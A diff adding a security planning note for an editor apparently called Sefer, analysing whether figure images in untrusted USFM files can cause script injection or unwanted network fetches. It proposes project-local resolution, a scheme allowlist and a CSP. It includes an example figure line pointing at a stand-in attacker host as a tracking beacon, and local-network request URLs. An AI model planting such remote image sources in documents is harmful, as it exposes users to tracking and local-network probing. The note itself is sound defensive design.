@@ -1,0 +1,59 @@
+---
+id: 768ecf5e-e5b1-4bb0-a65a-e7d45ca30f1b
+title: "Figure pictures: what Sefer may load"
+kind: plan
+status: idea
+created: 2026-10-22
+updated: 2026-10-22
+sha: "11768e45"
+priority: 2
+tags: [sefer, security, editor]
+related: [67e51530-16f0-481f-a7c5-531da917803d]
+source: conversation 2026-10-22, after figures were drawn on the editor bench
+---
+
+> Do we need to worry about xss with img tags btw?
+
+## The answer
+
+**Script injection: no.** The figure's picture is built with the DOM, not HTML
+(`FigureWidget` in `packages/editor/src/core/decorations.ts`: `createElement("img")`, then
+`image.src`; labels and tooltips through `textContent` and `title`). Nothing in the editor package
+or Sefer uses `innerHTML`. A hostile `src` cannot run code from an `<img>`: browsers do not run a
+`javascript:` URL there, and an SVG loaded as an image runs no script. Attribute values in the
+popover are set through `input.value`.
+
+**The fetch itself is the risk.** A USFM file is untrusted input: it comes from git, or someone
+else's project. `\fig … |src="https://evil.example/t.gif?id=…"\fig*` would make the app fetch that
+URL as soon as the verse scrolls into view. That tells a stranger who opened the file, from where
+and when, and it lets a document make GET requests to the local network (`http://192.168.1.1/…`,
+`http://localhost:…`). On desktop nothing narrows it: Tauri's CSP is off (`"csp": null` in
+`src-tauri/tauri.conf.json`).
+
+## Where it stands
+
+- **The editor package fetches nothing on its own.** With no `resolveSource` a figure draws a frame
+  (`recipes/figures.ts`, `core/figures.ts`'s `figureSource`).
+- **Only the editor bench resolves a `src`,** and it passes URLs through as they are. Right for a
+  demo, wrong for Sefer.
+- **Sefer passes no resolver yet,** so today it fetches nothing.
+
+## What to do
+
+<Followup id="project-local">**Sefer's resolver resolves project-local pictures only:** a figure's
+`src` names a file in the project (its illustrations folder), read through the `FileSystem` port
+and served as a `blob:` URL. A raw remote URL in a document is never fetched. Remote pictures, if
+ever wanted, are a setting the user turns on, per project.</Followup>
+
+<Followup id="scheme-allowlist">**Defence in depth in the package:** `FigureWidget` accepts only
+`blob:`, `https:` and `data:image/` URLs from a resolver and draws the frame for anything else, so
+a careless host resolver cannot point an `<img>` at `http:` (the local network) or `file:`.
+A few lines in `core/decorations.ts`.</Followup>
+
+<Followup id="desktop-csp">**A Content Security Policy for desktop,** with a tight `img-src`
+(`'self' blob: data:`), and the same thinking for the Web build. Broader than figures: everything
+the app loads falls under it, so it wants its own pass and a check that nothing legitimate
+breaks (the Galley wasm, fonts, the OTLP proxy in dev).</Followup>
+
+<Question id="remote-pictures">Should a project ever be able to show pictures from the web (a
+shared illustrations server), or are pictures always files in the project?</Question>
